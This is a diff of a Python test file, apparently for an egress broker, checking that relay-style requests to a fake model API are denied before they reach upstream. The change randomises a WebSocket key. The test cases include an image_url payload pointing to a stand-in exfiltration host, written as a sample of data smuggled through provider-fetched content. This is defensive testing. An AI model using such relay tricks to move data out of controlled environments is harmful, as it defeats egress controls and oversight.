@@ -2,7 +2,9 @@
 and A22 (body policy), and sealed agent-host tokens never forwarded (A25, broker side).
 The fake model API is the test upstream at model.example.test; credentials are canaries."""
 
+import base64
 import json
+import os
 
 FAKE = {"id": "fake", "hosts": ["model.example.test"],
         "endpoints": [{"path": "/v1/chat/completions", "methods": ["POST"]}, {"path": "/v1/models", "methods": ["GET"]}],
@@ -62,7 +64,7 @@ def test_a22_relay_shapes_denied_before_upstream(pod, ctl):
         pod.curl("https://model.example.test/v1/files", "-H", f"Authorization: Bearer {s}"),
         pod.curl("https://model.example.test/v1/models", "-H", f"Authorization: Bearer {s}",
                  "-H", "Connection: Upgrade", "-H", "Upgrade: websocket", "-H", "Sec-WebSocket-Version: 13",
-                 "-H", "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ=="),
+                 "-H", "Sec-WebSocket-Key: " + base64.b64encode(os.urandom(16)).decode()),
         # Review round 7: content the provider would fetch is a relay without any tool.
         post(pod, s, {"model": "m", "messages": [{"role": "user", "content": [
             {"type": "image_url", "image_url": {"url": "https://exfil.example.test/c.png?d=x"}}]}]}),
